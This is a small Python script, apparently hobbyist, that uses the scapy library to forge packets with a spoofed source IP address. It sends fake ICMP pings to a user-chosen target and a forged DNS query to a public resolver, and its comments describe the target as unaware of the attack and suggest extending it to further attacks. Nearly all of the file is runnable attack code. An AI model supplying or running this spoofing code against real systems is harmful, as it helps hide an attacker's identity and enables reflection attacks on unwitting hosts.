

# the code implements first , the identity/IP SPOOFING as directed by the user 
# till now this code can do spoofed pinging to the remnote machine as target is being unaware of the attack 

from scapy.all import *
import sys
import os 
iface = raw_input("your active network inetrface")

fake_ip = raw_input("Enter fake ip address here")
destination_ip = raw_input("target ip address here")

dns_destination ='8.8.8.8'  # used of google here
# packet manipulation function using scapy 

def ping(source, destination, iface):
    srloop(IP(src=source,dst=destination)/ICMP(), iface=iface)
# dns query resolution 

def dnsQuery(source, destination, iface):
    sr1(IP(dst=destination,src=source)/UDP()/DNS(rd=1,qd=DNSQR(qname="example.com")))

# exception handling here 
try:
    print ("Starting Ping")
    # ping(fake_ip,destination_ip,iface)
    dnsQuery(fake_ip,dns_destination,iface)

except KeyboardInterrupt:

    print("shutting down...the code...) ")
    sys.exit(0)
# can be manipulated to perform further attacks from identity theft 
# :))//
